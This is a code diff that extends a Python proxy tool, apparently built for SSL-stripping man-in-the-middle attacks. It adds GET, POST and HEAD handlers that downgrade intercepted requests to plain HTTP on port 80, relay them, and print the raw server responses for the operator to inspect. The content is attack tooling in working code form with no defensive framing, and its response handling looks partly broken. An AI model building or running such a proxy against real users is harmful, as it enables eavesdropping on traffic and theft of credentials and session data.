@@ -23,7 +23,7 @@ class Dump0sf:
 
     class RequestHandler(http.server.BaseHTTPRequestHandler):
         def do_CONNECT(self):
-            """Handle HTTPS requests."""
+            """Handle HTTPS requests (SSL stripping)."""
             try:
                 # This is where SSL stripping occurs, by establishing a plain HTTP connection
                 print(f"[*] HTTPS Request Detected from {self.client_address}")
@@ -43,6 +43,55 @@ class Dump0sf:
                 self.proxy_connection(client_socket)
             except Exception as e:
                 print(f"[!] Error in handling CONNECT: {e}")
+                self.send_response(500)
+                self.end_headers()
+
+        def do_GET(self):
+            """Handle GET requests (HTTP method)."""
+            self.handle_http_request()
+
+        def do_POST(self):
+            """Handle POST requests (HTTP method)."""
+            self.handle_http_request()
+
+        def do_HEAD(self):
+            """Handle HEAD requests (HTTP method)."""
+            self.handle_http_request()
+
+        def handle_http_request(self):
+            """Handle HTTP requests (GET, POST, HEAD, etc.)."""
+            try:
+                print(f"[*] HTTP Request from {self.client_address}")
+                target_host = self.headers['Host']
+
+                # Create a plain HTTP connection to the target server
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket.connect((target_host, 80))  # Always use port 80 for HTTP (no SSL)
+
+                # Forward the original request to the server
+                request_data = self.requestline + "\r\n"
+                for header, value in self.headers.items():
+                    request_data += f"{header}: {value}\r\n"
+                request_data += "\r\n"
+                client_socket.sendall(request_data.encode())
+
+                # Read the response from the server
+                response_data = client_socket.recv(1024)
+                
+                # Print raw response for inspection
+                print(f"Raw data from server: {response_data.decode(errors='ignore')}")
+                
+                # Forward the response back to the client
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                self.wfile.write(response_data)
+
+                # Close the client-server connection
+                client_socket.close()
+
+            except Exception as e:
+                print(f"[!] Error in HTTP request handling: {e}")
                 self.send_response(500)
                 self.end_headers()
 
